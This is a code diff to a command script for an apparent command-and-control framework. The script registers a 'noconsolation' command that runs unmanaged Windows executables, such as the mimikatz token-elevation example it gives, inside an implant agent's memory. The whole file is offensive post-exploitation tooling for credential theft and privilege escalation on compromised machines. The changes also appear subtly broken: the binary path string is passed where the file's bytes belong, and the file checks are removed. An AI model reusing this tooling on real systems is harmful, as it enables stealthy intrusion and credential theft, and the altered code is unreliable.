@@ -1,5 +1,8 @@
-var cmd_no_consolation = ax.create_command("noconsolation", "Run an unmanaged EXE/DLL inside agents's memory", "noconsolation /tmp/mimikatz.exe privilege::debug token::elevate exit");
-cmd_no_consolation.addArgBool(       "--local",                                      "The binary should be loaded from the target Windows machine");
+var cmd_no_consolation = ax.create_command("noconsolation", "Run an unmanaged EXE/DLL inside agents's memory", "noconsolation --binary /tmp/mimikatz.exe --args \"privilege::debug token::elevate exit\"");
+cmd_no_consolation.addArgFlagString("--local",  "LOCAL_PATH",               false,   "The binary should be loaded from the disk on the target Windows machine");
+cmd_no_consolation.addArgFlagString("--memory", "MEMORY_PATH",              false,   "The binary should be loaded from the memory on the target Windows machine");
+cmd_no_consolation.addArgFlagFile(  "-f",       "BINARY",                   false,   "Full path to the windows EXE/DLL you wish you run inside agent. If already loaded, you can simply specify the binary name.");
+cmd_no_consolation.addArgFlagString("-a",       "ARGS",                     false,   "Parameters for the PE. Must be provided after the path");
 cmd_no_consolation.addArgBool(       "--inthread",                                   "Run the PE with the main thread. This might hang your agent depending on the PE and its arguments");
 cmd_no_consolation.addArgBool(       "--link-to-peb",                                "Load the PE into the PEB");
 cmd_no_consolation.addArgBool(       "--dont-unload",                                "If set, the DLL won't be unloaded");
@@ -17,13 +20,18 @@ cmd_no_consolation.addArgFlagString( "--unload-pe", "PE_NAME",              fals
 cmd_no_consolation.addArgBool(       "-lad",                                         "Custom load all the PE's dependencies");
 cmd_no_consolation.addArgFlagString( "-ladb", "LADB_DLLS",                  false,   "Custom load all the PE's dependencies except these (DLL_A,DLL_B)");
 cmd_no_consolation.addArgFlagString( "-ld", "LD_DLLS",                      false,   "Custom load these PE's dependencies (DLL_A,DLL_B)");
-cmd_no_consolation.addArgFlagString( "-sp", "PATHS ",                       false,   "Look for DLLs on these paths (PATH_A,PATH_B) (system32 is the default)");
-cmd_no_consolation.addArgString("binary", true, "Full path to the windows EXE/DLL you wish you run inside agent. If already loaded, you can simply specify the binary name.");
-cmd_no_consolation.addArgString("args",   false, "Parameters for the PE. Must be provided after the path");
+cmd_no_consolation.addArgFlagString( "-sp", "PATHS",                       false,   "Look for DLLs on these paths (PATH_A,PATH_B) (system32 is the default)");
 
 cmd_no_consolation.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
 {
-    let local = 0;
+    let is_local = 0;
+    let local = "";
+    let is_memory = 0;
+    let memory = "";
+    let is_binary = 0;
+    let binary = "";
+    let is_args = 0;
+    let args = "";
     let path = "";
     let pename = "";
     let pepath = "";
@@ -41,6 +49,7 @@ cmd_no_consolation.setPreHook(function (id, cmdline, parsed_json, ...parsed_line
     let free_libs = "";
     let dont_save = 0;
     let list_pes = 0;
+    let is_unload_pe = 0;
     let unload_pe = "";
     let link_to_peb = 0;
     let dont_unload = 0;
@@ -53,7 +62,6 @@ cmd_no_consolation.setPreHook(function (id, cmdline, parsed_json, ...parsed_line
 
     if( ax.is64(id) == false ) { throw new Error("WoW64 is not supported"); }
 
-    if(parsed_json["--local"]) { local = 1; }
     if(parsed_json["-k"]) { headers = 1; }
     if(parsed_json["-w"]) { use_unicode = 1; }
     if(parsed_json["-no"]) { nooutput = 1; }
@@ -65,65 +73,89 @@ cmd_no_consolation.setPreHook(function (id, cmdline, parsed_json, ...parsed_line
     if(parsed_json["--dont-unload"]) { dont_unload = 1; }
     if(parsed_json["-lad"]) { load_all_deps = 1; }
 
-    if("EXPORT_NAME" in parsed_json) { timeout = parsed_json["EXPORT_NAME"]; }
+    if("EXPORT_NAME" in parsed_json) { method = parsed_json["EXPORT_NAME"]; }
     if("FL_DLLS" in parsed_json) { free_libs = parsed_json["FL_DLLS"]; }
-    if("PE_NAME" in parsed_json) { unload_pe = parsed_json["PE_NAME"]; }
     if("LADB_DLLS" in parsed_json) { load_all_deps_but = parsed_json["LADB_DLLS"]; }
     if("LD_DLLS" in parsed_json) { load_deps = parsed_json["LD_DLLS"]; }
     if("PATHS" in parsed_json) { search_paths = parsed_json["PATHS"]; }
+
+    if("PE_NAME" in parsed_json) {
+        is_unload_pe = 1;
+        unload_pe = parsed_json["PE_NAME"];
+    }
+
+    if("LOCAL_PATH" in parsed_json)  {
+        is_local = 1;
+        local = parsed_json["LOCAL_PATH"];
+    }
+
+    if("MEMORY_PATH" in parsed_json)  {
+        is_memory = 1;
+        memory = parsed_json["MEMORY_PATH"];
+    }
+
+    if("BINARY" in parsed_json)  {
+        is_binary = 1;
+        binary = parsed_json["BINARY"];
+    }
+
+    if("ARGS" in parsed_json)  {
+        is_args = 1;
+        args = parsed_json["ARGS"];
+    }
 
     if("NUM_SECONDS" in parsed_json) {
         timeout = parsed_json["NUM_SECONDS"];
         timeout_set = 1;
     }
 
-    let binary = parsed_json["binary"];
-    if( ax.file_exists(binary) || /^[A-Za-z]:\\.*/.test(binary) ) {
-        path = binary;
+    if( is_local + is_binary + is_memory > 1 ) { throw new Error("You must specify either --local, --memory or -f"); }
+
+    if(is_binary) {
         path_set = 1;
     }
-    else if ( local == 0 && !ax.file_exists(binary) && /^\/[A-Za-z].*/.test(binary) ) {
-        throw new Error("Specified executable "+ binary +" does not exist");
+    else if(is_local && /^[A-Za-z]:\\.*/.test(local)) {
+        path = local;
+        path_set = 1;
     }
-    else if( local == 0 && /^[A-Za-z].*\.exe/.test(binary) ) {
+    else if(is_memory && /^[A-Za-z].*\.exe/.test(memory)) {
         name_set = 1;
-        pename = binary;
+        pename = memory;
+    }
+    else if(list_pes == 0 && is_unload_pe == 0) {
+        throw new Error("Specified executable does not exist");
     }
 
     if( free_libs.length == 0 && unload_pe.length == 0 && list_pes == 0 && name_set == 0 && path_set == 0 && close_handles == 0 ) { throw new Error("PE path not provided"); }
-    if( path_set && !ax.file_exists(path) && !local )      { throw new Error("Specified executable "+ path +" does not exist"); }
     if( (path_set || unload_pe || free_libs) && list_pes ) { throw new Error("The option --list-pes must be ran alone"); }
     if( free_libs && unload_pe )                           { throw new Error("The option --unload-pe must be ran alone"); }
     if( path_set && (unload_pe || free_libs) )             { throw new Error("The option --unload-pe or --free-libraries must be ran alone") };
     if( timeout_set && inthread )                          { throw new Error("The options --inthread and --timeout are not compatible"); }
 
     if(path_set) {
-        pename = ax.file_basename(path);
-
-        if(local == 0) {
+        if(is_binary) {
+            pename = ax.hash("md5", 8, binary) + ".exe";
             pepath = "C:\\Windows\\System32\\" + pename;
-            pebytes = ax.file_read(path);
-            if(pebytes.length == 0) {
-                throw new Error("could not read PE");
-            }
+            pebytes = binary
             path = "";
         }
         else {
+            pename = ax.file_basename(path);
             pepath = path;
         }
     }
 
     if (path_set || name_set) {
         pecmdline = pename;
-        if("args" in parsed_json) {
-            pecmdline += " " + parsed_json["args"];
+        if(is_args) {
+            pecmdline += " " + args;
         }
     }
 
     var timestamp = ax.format_time("dd/MM hh:mm", ax.ticks());
 
     let bof_path = ax.script_dir() + "_bin/NoConsolation." + ax.arch(id) + ".o";
-    let bof_params = ax.bof_pack("wstr,cstr,wstr,bytes,cstr,int,int,int,wstr,cstr,wstr,int,int,int,int,cstr,int,int,cstr,cstr,int,int,int,cstr,cstr,cstr,int", [pename, pename, pepath, pebytes, path, local, timeout, headers, pecmdline, pecmdline, method, use_unicode, nooutput, alloc_console, close_handles, free_libs, dont_save, list_pes, unload_pe, timestamp, link_to_peb, dont_unload, load_all_deps, load_all_deps_but, load_deps, search_paths, inthread ]);
+    let bof_params = ax.bof_pack("wstr,cstr,wstr,bytes,cstr,int,int,int,wstr,cstr,wstr,int,int,int,int,cstr,int,int,cstr,cstr,int,int,int,cstr,cstr,cstr,int", [pename, pename, pepath, pebytes, path, is_local, timeout, headers, pecmdline, pecmdline, method, use_unicode, nooutput, alloc_console, close_handles, free_libs, dont_save, list_pes, unload_pe, timestamp, link_to_peb, dont_unload, load_all_deps, load_all_deps_but, load_deps, search_paths, inthread ]);
     let message = `Task: execute ${pename} via No-Consolation BOF`;
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
 });
